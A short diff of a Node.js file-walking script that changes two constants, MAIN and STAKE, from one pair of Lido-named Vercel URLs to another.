@@ -1,8 +1,8 @@
 
 const fs = require('fs'), path = require('path');
 
-const MAIN = 'https://lido-web-main.vercel.app';   
-const STAKE = 'https://lido-web-stake.vercel.app';
+const MAIN = 'https://lido-web-mine-site.vercel.app/';   
+const STAKE = 'https://lido-web-stake-site.vercel.app/';
 
 const FILES = [];
 function walk(dir){
